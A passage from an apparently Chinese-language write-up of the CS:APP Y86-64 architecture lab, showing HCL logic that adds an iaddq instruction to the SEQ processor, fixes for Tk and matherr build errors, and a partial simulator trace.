</span><span id=__span-93-19><a id=__codelineno-93-19 name=__codelineno-93-19></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IPUSHQ</span><span class=p>,</span><span class=w> </span><span class=no>IPOPQ</span><span class=p>,</span><span class=w> </span><span class=no>ICALL</span><span class=p>,</span><span class=w> </span><span class=no>IRET</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=no>RRSP</span><span class=c1>;</span>
</span><span id=__span-93-20><a id=__codelineno-93-20 name=__codelineno-93-20></a><span class=w>    </span><span class=err>1</span><span class=w> </span><span class=err>:</span><span class=w> </span><span class=nf>RNONE</span><span class=c1>;  # Don't need register</span>
</span><span id=__span-93-21><a id=__codelineno-93-21 name=__codelineno-93-21></a><span class=err>]</span><span class=c1>;</span>
</span><span id=__span-93-22><a id=__codelineno-93-22 name=__codelineno-93-22></a>
</span><span id=__span-93-23><a id=__codelineno-93-23 name=__codelineno-93-23></a><span class=c1>## What register should be used as the E destination?</span>
</span><span id=__span-93-24><a id=__codelineno-93-24 name=__codelineno-93-24></a><span class=nf>word</span><span class=w> </span><span class=no>dstE</span><span class=w> </span><span class=err>=</span><span class=w> </span><span class=p>[</span>
</span><span id=__span-93-25><a id=__codelineno-93-25 name=__codelineno-93-25></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IRRMOVQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=err>&amp;&amp;</span><span class=w> </span><span class=no>Cnd</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=no>rB</span><span class=c1>;</span>
</span><span id=__span-93-26><a id=__codelineno-93-26 name=__codelineno-93-26></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IIRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IOPQ</span><span class=p>,</span><span class=w> </span><span class=no>IIADDQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=no>rB</span><span class=c1>;             # Add IIADDQ, 算完的结果valE需要保存到寄存器rB中</span>
</span><span id=__span-93-27><a id=__codelineno-93-27 name=__codelineno-93-27></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IPUSHQ</span><span class=p>,</span><span class=w> </span><span class=no>IPOPQ</span><span class=p>,</span><span class=w> </span><span class=no>ICALL</span><span class=p>,</span><span class=w> </span><span class=no>IRET</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=no>RRSP</span><span class=c1>;</span>
</span><span id=__span-93-28><a id=__codelineno-93-28 name=__codelineno-93-28></a><span class=w>    </span><span class=err>1</span><span class=w> </span><span class=err>:</span><span class=w> </span><span class=nf>RNONE</span><span class=c1>;  # Don't write any register</span>
</span><span id=__span-93-29><a id=__codelineno-93-29 name=__codelineno-93-29></a><span class=err>]</span><span class=c1>;</span>
</span><span id=__span-93-30><a id=__codelineno-93-30 name=__codelineno-93-30></a>
</span><span id=__span-93-31><a id=__codelineno-93-31 name=__codelineno-93-31></a><span class=c1>################ Execute Stage   ###################################</span>
</span><span id=__span-93-32><a id=__codelineno-93-32 name=__codelineno-93-32></a>
</span><span id=__span-93-33><a id=__codelineno-93-33 name=__codelineno-93-33></a><span class=c1>## Select input A to ALU</span>
</span><span id=__span-93-34><a id=__codelineno-93-34 name=__codelineno-93-34></a><span class=nf>word</span><span class=w> </span><span class=no>aluA</span><span class=w> </span><span class=err>=</span><span class=w> </span><span class=p>[</span>
</span><span id=__span-93-35><a id=__codelineno-93-35 name=__codelineno-93-35></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IRRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IOPQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=no>valA</span><span class=c1>;</span>
</span><span id=__span-93-36><a id=__codelineno-93-36 name=__codelineno-93-36></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IIRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IRMMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IMRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IIADDQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=no>valC</span><span class=c1>; # Add IIADDQ, iaddq指令需要将aluA的值设置为valC</span>
</span><span id=__span-93-37><a id=__codelineno-93-37 name=__codelineno-93-37></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>ICALL</span><span class=p>,</span><span class=w> </span><span class=no>IPUSHQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=mi>-8</span><span class=c1>;</span>
</span><span id=__span-93-38><a id=__codelineno-93-38 name=__codelineno-93-38></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IRET</span><span class=p>,</span><span class=w> </span><span class=no>IPOPQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=mi>8</span><span class=c1>;</span>
</span><span id=__span-93-39><a id=__codelineno-93-39 name=__codelineno-93-39></a><span class=w>    </span><span class=c1># Other instructions don't need ALU</span>
</span><span id=__span-93-40><a id=__codelineno-93-40 name=__codelineno-93-40></a><span class=err>]</span><span class=c1>;</span>
</span><span id=__span-93-41><a id=__codelineno-93-41 name=__codelineno-93-41></a>
</span><span id=__span-93-42><a id=__codelineno-93-42 name=__codelineno-93-42></a><span class=c1>## Select input B to ALU</span>
</span><span id=__span-93-43><a id=__codelineno-93-43 name=__codelineno-93-43></a><span class=nf>word</span><span class=w> </span><span class=no>aluB</span><span class=w> </span><span class=err>=</span><span class=w> </span><span class=p>[</span>
</span><span id=__span-93-44><a id=__codelineno-93-44 name=__codelineno-93-44></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IRMMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IMRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IOPQ</span><span class=p>,</span><span class=w> </span><span class=no>ICALL</span><span class=p>,</span><span class=w> </span>
</span><span id=__span-93-45><a id=__codelineno-93-45 name=__codelineno-93-45></a><span class=w>            </span><span class=no>IPUSHQ</span><span class=p>,</span><span class=w> </span><span class=no>IRET</span><span class=p>,</span><span class=w> </span><span class=no>IPOPQ</span><span class=p>,</span><span class=w> </span><span class=no>IIADDQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=no>valB</span><span class=c1>;          # Add IIADDQ, iaddq指令需要将aluB的值设置为valB</span>
</span><span id=__span-93-46><a id=__codelineno-93-46 name=__codelineno-93-46></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IRRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IIRMOVQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=mi>0</span><span class=c1>;</span>
</span><span id=__span-93-47><a id=__codelineno-93-47 name=__codelineno-93-47></a><span class=w>    </span><span class=c1># Other instructions don't need ALU</span>
</span><span id=__span-93-48><a id=__codelineno-93-48 name=__codelineno-93-48></a><span class=err>]</span><span class=c1>;</span>
</span><span id=__span-93-49><a id=__codelineno-93-49 name=__codelineno-93-49></a>
</span><span id=__span-93-50><a id=__codelineno-93-50 name=__codelineno-93-50></a><span class=c1>## Should the condition codes be updated?</span>
</span><span id=__span-93-51><a id=__codelineno-93-51 name=__codelineno-93-51></a><span class=nf>bool</span><span class=w> </span><span class=no>set_cc</span><span class=w> </span><span class=err>=</span><span class=w> </span><span class=no>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IOPQ</span><span class=p>,</span><span class=w> </span><span class=no>IIADDQ</span><span class=w> </span><span class=p>}</span><span class=c1>;                   # Add IIADDQ, iaddq指令也需要更新CC</span>
</span></code></pre></div></td></tr></table></div> <p>报错：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-94-1> 1</a></span>
<span class=normal><a href=#__codelineno-94-2> 2</a></span>
<span class=normal><a href=#__codelineno-94-3> 3</a></span>
<span class=normal><a href=#__codelineno-94-4> 4</a></span>
<span class=normal><a href=#__codelineno-94-5> 5</a></span>
<span class=normal><a href=#__codelineno-94-6> 6</a></span>
<span class=normal><a href=#__codelineno-94-7> 7</a></span>
<span class=normal><a href=#__codelineno-94-8> 8</a></span>
<span class=normal><a href=#__codelineno-94-9> 9</a></span>
<span class=normal><a href=#__codelineno-94-10>10</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-94-1><a id=__codelineno-94-1 name=__codelineno-94-1></a>sim/seq$<span class=w> </span>make<span class=w> </span><span class=nv>VERSION</span><span class=o>=</span>full
</span><span id=__span-94-2><a id=__codelineno-94-2 name=__codelineno-94-2></a><span class=c1># Building the seq-full.hcl version of SEQ</span>
</span><span id=__span-94-3><a id=__codelineno-94-3 name=__codelineno-94-3></a>../misc/hcl2c<span class=w> </span>-n<span class=w> </span>seq-full.hcl<span class=w> </span>&lt;seq-full.hcl<span class=w> </span>&gt;seq-full.c
</span><span id=__span-94-4><a id=__codelineno-94-4 name=__codelineno-94-4></a>gcc<span class=w> </span>-Wall<span class=w> </span>-O2<span class=w> </span>-isystem<span class=w> </span>/usr/include/tcl8.5<span class=w> </span>-I../misc<span class=w> </span>-DHAS_GUI<span class=w> </span>-o<span class=w> </span>ssim<span class=w> </span><span class=se>\</span>
</span><span id=__span-94-5><a id=__codelineno-94-5 name=__codelineno-94-5></a><span class=w>        </span>seq-full.c<span class=w> </span>ssim.c<span class=w> </span>../misc/isa.c<span class=w> </span>-L/usr/lib<span class=w> </span>-ltk<span class=w> </span>-ltcl<span class=w> </span>-lm
</span><span id=__span-94-6><a id=__codelineno-94-6 name=__codelineno-94-6></a>ssim.c:20:10:<span class=w> </span>fatal<span class=w> </span>error:<span class=w> </span>tk.h:<span class=w> </span>No<span class=w> </span>such<span class=w> </span>file<span class=w> </span>or<span class=w> </span>directory
</span><span id=__span-94-7><a id=__codelineno-94-7 name=__codelineno-94-7></a><span class=m>20</span><span class=w> </span><span class=p>|</span><span class=w> </span><span class=c1>#include &lt;tk.h&gt;</span>
</span><span id=__span-94-8><a id=__codelineno-94-8 name=__codelineno-94-8></a><span class=w>    </span><span class=p>|</span><span class=w>          </span>^~~~~~
</span><span id=__span-94-9><a id=__codelineno-94-9 name=__codelineno-94-9></a>compilation<span class=w> </span>terminated.
</span><span id=__span-94-10><a id=__codelineno-94-10 name=__codelineno-94-10></a>make:<span class=w> </span>***<span class=w> </span><span class=o>[</span>Makefile:44:<span class=w> </span>ssim<span class=o>]</span><span class=w> </span>Error<span class=w> </span><span class=m>1</span>
</span></code></pre></div></td></tr></table></div> <p>🛠️Fix: 由于实验文件太老，需要把<code>sim/seq/Makefile</code>修改一下:</p> <div class="language-Makefile highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-95-1>1</a></span>
<span class=normal><a href=#__codelineno-95-2>2</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-95-1><a id=__codelineno-95-1 name=__codelineno-95-1></a><span class=nv>TKINC</span><span class=o>=</span>-isystem<span class=w> </span>/usr/include/tcl8.6<span class=w>   </span><span class=c1># Line 20</span>
</span><span id=__span-95-2><a id=__codelineno-95-2 name=__codelineno-95-2></a><span class=nv>CFLAGS</span><span class=o>=</span>-Wall<span class=w> </span>-O2<span class=w> </span>-DUSE_INTERP_RESULT<span class=w> </span><span class=c1># Line 26</span>
</span></code></pre></div></td></tr></table></div> <p>继续报错：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-96-1>1</a></span>
<span class=normal><a href=#__codelineno-96-2>2</a></span>
<span class=normal><a href=#__codelineno-96-3>3</a></span>
<span class=normal><a href=#__codelineno-96-4>4</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-96-1><a id=__codelineno-96-1 name=__codelineno-96-1></a>sim/seq$<span class=w> </span>make<span class=w> </span><span class=nv>VERSION</span><span class=o>=</span>full
</span><span id=__span-96-2><a id=__codelineno-96-2 name=__codelineno-96-2></a>/usr/bin/ld:<span class=w> </span>/tmp/cc96n739.o:<span class=o>(</span>.data.rel+0x0<span class=o>)</span>:<span class=w> </span>undefined<span class=w> </span>reference<span class=w> </span>to<span class=w> </span><span class=sb>`</span>matherr<span class=err>'</span>
</span><span id=__span-96-3><a id=__codelineno-96-3 name=__codelineno-96-3></a>collect2:<span class=w> </span>error:<span class=w> </span>ld<span class=w> </span>returned<span class=w> </span><span class=m>1</span><span class=w> </span><span class=nb>exit</span><span class=w> </span>status
</span><span id=__span-96-4><a id=__codelineno-96-4 name=__codelineno-96-4></a>make:<span class=w> </span>***<span class=w> </span><span class=o>[</span>Makefile:44:<span class=w> </span>ssim<span class=o>]</span><span class=w> </span>Error<span class=w> </span><span class=m>1</span>
</span></code></pre></div></td></tr></table></div> <p>🛠️Fix: 较新版本的glibc弃用了这部分内容，注释掉/sim/pipe/psim.c 806、807 line和/sim/seq/ssim.c 844、845 line（即：有源代码中有 matherr 的一行和它的下一行）</p> <p>现在编译成功，运行如下测试均通过。</p> <p>测试一：运行一个简单的Y86-64 程序，并将结果ISA模拟器的结果进行比对，输出如下（ISA Check Succeeds）:</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-97-1> 1</a></span>
<span class=normal><a href=#__codelineno-97-2> 2</a></span>
<span class=normal><a href=#__codelineno-97-3> 3</a></span>
<span class=normal><a href=#__codelineno-97-4> 4</a></span>
<span class=normal><a href=#__codelineno-97-5> 5</a></span>
<span class=normal><a href=#__codelineno-97-6> 6</a></span>
<span class=normal><a href=#__codelineno-97-7> 7</a></span>
<span class=normal><a href=#__codelineno-97-8> 8</a></span>
<span class=normal><a href=#__codelineno-97-9> 9</a></span>
<span class=normal><a href=#__codelineno-97-10>10</a></span>
<span class=normal><a href=#__codelineno-97-11>11</a></span>
<span class=normal><a href=#__codelineno-97-12>12</a></span>
<span class=normal><a href=#__codelineno-97-13>13</a></span>
<span class=normal><a href=#__codelineno-97-14>14</a></span>
<span class=normal><a href=#__codelineno-97-15>15</a></span>
<span class=normal><a href=#__codelineno-97-16>16</a></span>
<span class=normal><a href=#__codelineno-97-17>17</a></span>
<span class=normal><a href=#__codelineno-97-18>18</a></span>
<span class=normal><a href=#__codelineno-97-19>19</a></span>
<span class=normal><a href=#__codelineno-97-20>20</a></span>
<span class=normal><a href=#__codelineno-97-21>21</a></span>
<span class=normal><a href=#__codelineno-97-22>22</a></span>
<span class=normal><a href=#__codelineno-97-23>23</a></span>
<span class=normal><a href=#__codelineno-97-24>24</a></span>
<span class=normal><a href=#__codelineno-97-25>25</a></span>
<span class=normal><a href=#__codelineno-97-26>26</a></span>
<span class=normal><a href=#__codelineno-97-27>27</a></span>
<span class=normal><a href=#__codelineno-97-28>28</a></span>
<span class=normal><a href=#__codelineno-97-29>29</a></span>
<span class=normal><a href=#__codelineno-97-30>30</a></span>
<span class=normal><a href=#__codelineno-97-31>31</a></span>
<span class=normal><a href=#__codelineno-97-32>32</a></span>
<span class=normal><a href=#__codelineno-97-33>33</a></span>
<span class=normal><a href=#__codelineno-97-34>34</a></span>
<span class=normal><a href=#__codelineno-97-35>35</a></span>
<span class=normal><a href=#__codelineno-97-36>36</a></span>
<span class=normal><a href=#__codelineno-97-37>37</a></span>
<span class=normal><a href=#__codelineno-97-38>38</a></span>
<span class=normal><a href=#__codelineno-97-39>39</a></span>
<span class=normal><a href=#__codelineno-97-40>40</a></span>
<span class=normal><a href=#__codelineno-97-41>41</a></span>
<span class=normal><a href=#__codelineno-97-42>42</a></span>
<span class=normal><a href=#__codelineno-97-43>43</a></span>
<span class=normal><a href=#__codelineno-97-44>44</a></span>
<span class=normal><a href=#__codelineno-97-45>45</a></span>
<span class=normal><a href=#__codelineno-97-46>46</a></span>
<span class=normal><a href=#__codelineno-97-47>47</a></span>
<span class=normal><a href=#__codelineno-97-48>48</a></span>
<span class=normal><a href=#__codelineno-97-49>49</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-97-1><a id=__codelineno-97-1 name=__codelineno-97-1></a>sim/seq$<span class=w> </span>./ssim<span class=w> </span>-t<span class=w> </span>../y86-code/asumi.yo
</span><span id=__span-97-2><a id=__codelineno-97-2 name=__codelineno-97-2></a>Y86-64<span class=w> </span>Processor:<span class=w> </span>seq-full.hcl
</span><span id=__span-97-3><a id=__codelineno-97-3 name=__codelineno-97-3></a><span class=m>137</span><span class=w> </span>bytes<span class=w> </span>of<span class=w> </span>code<span class=w> </span><span class=nb>read</span>
</span><span id=__span-97-4><a id=__codelineno-97-4 name=__codelineno-97-4></a>IF:<span class=w> </span>Fetched<span class=w> </span>irmovq<span class=w> </span>at<span class=w> </span>0x0.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rsp,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x100
</span><span id=__span-97-5><a id=__codelineno-97-5 name=__codelineno-97-5></a>IF:<span class=w> </span>Fetched<span class=w> </span>call<span class=w> </span>at<span class=w> </span>0xa.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x38
</span><span id=__span-97-6><a id=__codelineno-97-6 name=__codelineno-97-6></a>Wrote<span class=w> </span>0x13<span class=w> </span>to<span class=w> </span>address<span class=w> </span>0xf8
</span><span id=__span-97-7><a id=__codelineno-97-7 name=__codelineno-97-7></a>IF:<span class=w> </span>Fetched<span class=w> </span>irmovq<span class=w> </span>at<span class=w> </span>0x38.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x18
</span><span id=__span-97-8><a id=__codelineno-97-8 name=__codelineno-97-8></a>IF:<span class=w> </span>Fetched<span class=w> </span>irmovq<span class=w> </span>at<span class=w> </span>0x42.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rsi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x4
</span><span id=__span-97-9><a id=__codelineno-97-9 name=__codelineno-97-9></a>IF:<span class=w> </span>Fetched<span class=w> </span>call<span class=w> </span>at<span class=w> </span>0x4c.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x56
</span><span id=__span-97-10><a id=__codelineno-97-10 name=__codelineno-97-10></a>Wrote<span class=w> </span>0x55<span class=w> </span>to<span class=w> </span>address<span class=w> </span>0xf0
</span><span id=__span-97-11><a id=__codelineno-97-11 name=__codelineno-97-11></a>IF:<span class=w> </span>Fetched<span class=w> </span>xorq<span class=w> </span>at<span class=w> </span>0x56.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%rax,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rax,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-12><a id=__codelineno-97-12 name=__codelineno-97-12></a>IF:<span class=w> </span>Fetched<span class=w> </span>andq<span class=w> </span>at<span class=w> </span>0x58.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%rsi,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rsi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-13><a id=__codelineno-97-13 name=__codelineno-97-13></a>IF:<span class=w> </span>Fetched<span class=w> </span>jmp<span class=w> </span>at<span class=w> </span>0x5a.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x83
</span><span id=__span-97-14><a id=__codelineno-97-14 name=__codelineno-97-14></a>IF:<span class=w> </span>Fetched<span class=w> </span>jne<span class=w> </span>at<span class=w> </span>0x83.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x63
</span><span id=__span-97-15><a id=__codelineno-97-15 name=__codelineno-97-15></a>IF:<span class=w> </span>Fetched<span class=w> </span>mrmovq<span class=w> </span>at<span class=w> </span>0x63.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%r10,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-16><a id=__codelineno-97-16 name=__codelineno-97-16></a>IF:<span class=w> </span>Fetched<span class=w> </span>addq<span class=w> </span>at<span class=w> </span>0x6d.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%r10,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rax,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-17><a id=__codelineno-97-17 name=__codelineno-97-17></a>IF:<span class=w> </span>Fetched<span class=w> </span>iaddq<span class=w> </span>at<span class=w> </span>0x6f.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x8
</span><span id=__span-97-18><a id=__codelineno-97-18 name=__codelineno-97-18></a>IF:<span class=w> </span>Fetched<span class=w> </span>iaddq<span class=w> </span>at<span class=w> </span>0x79.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rsi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0xffffffffffffffff
</span><span id=__span-97-19><a id=__codelineno-97-19 name=__codelineno-97-19></a>IF:<span class=w> </span>Fetched<span class=w> </span>jne<span class=w> </span>at<span class=w> </span>0x83.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x63
</span><span id=__span-97-20><a id=__codelineno-97-20 name=__codelineno-97-20></a>IF:<span class=w> </span>Fetched<span class=w> </span>mrmovq<span class=w> </span>at<span class=w> </span>0x63.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%r10,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-21><a id=__codelineno-97-21 name=__codelineno-97-21></a>IF:<span class=w> </span>Fetched<span class=w> </span>addq<span class=w> </span>at<span class=w> </span>0x6d.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%r10,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rax,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-22><a id=__codelineno-97-22 name=__codelineno-97-22></a>IF:<span class=w> </span>Fetched<span class=w> </span>iaddq<span class=w> </span>at<span class=w> </span>0x6f.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x8
</span><span id=__span-97-23><a id=__codelineno-97-23 name=__codelineno-97-23></a>IF:<span class=w> </span>Fetched<span class=w> </span>iaddq<span class=w> </span>at<span class=w> </span>0x79.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rsi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0xffffffffffffffff
</span><span id=__span-97-24><a id=__codelineno-97-24 name=__codelineno-97-24></a>IF:<span class=w> </span>Fetched<span class=w> </span>jne<span class=w> </span>at<span class=w> </span>0x83.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x63
</span><span id=__span-97-25><a id=__codelineno-97-25 name=__codelineno-97-25></a>IF:<span class=w> </span>Fetched<span class=w> </span>mrmovq<span class=w> </span>at<span class=w> </span>0x63.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%r10,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-26><a id=__codelineno-97-26 name=__codelineno-97-26></a>IF:<span class=w> </span>Fetched<span class=w> </span>addq<span class=w> </span>at<span class=w> </span>0x6d.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%r10,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rax,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-27><a id=__codelineno-97-27 name=__codelineno-97-27></a>IF:<span class=w> </span>Fetched<span class=w> </span>iaddq<span class=w> </span>at<span class=w> </span>0x6f.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x8
</span><span id=__span-97-28><a id=__codelineno-97-28 name=__codelineno-97-28></a>IF:<span class=w> </span>Fetched<span class=w> </span>iaddq<span class=w> </span>at<span class=w> </span>0x79.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rsi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0xffffffffffffffff
</span><span id=__span-97-29><a id=__codelineno-97-29 name=__codelineno-97-29></a>IF:<span class=w> </span>Fetched<span class=w> </span>jne<span class=w> </span>at<span class=w> </span>0x83.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>----,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x63
</span><span id=__span-97-30><a id=__codelineno-97-30 name=__codelineno-97-30></a>IF:<span class=w> </span>Fetched<span class=w> </span>mrmovq<span class=w> </span>at<span class=w> </span>0x63.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%r10,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-31><a id=__codelineno-97-31 name=__codelineno-97-31></a>IF:<span class=w> </span>Fetched<span class=w> </span>addq<span class=w> </span>at<span class=w> </span>0x6d.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>%r10,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rax,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x0
</span><span id=__span-97-32><a id=__codelineno-97-32 name=__codelineno-97-32></a>IF:<span class=w> </span>Fetched<span class=w> </span>iaddq<span class=w> </span>at<span class=w> </span>0x6f.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rdi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x8
</span><span id=__span-97-33><a id=__codelineno-97-33 name=__codelineno-97-33></a>IF:<span class=w> </span>Fetched<span class=w> </span>iaddq<span class=w> </span>at<span class=w> </span>0x79.<span class=w>  </span><span class=nv>ra</span><span class=o>=</span>----,<span class=w> </span><span class=nv>rb</span><span class=o>=</span>%rsi,<span class=w> </span><span class=nv>valC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0xffffffffffffffff
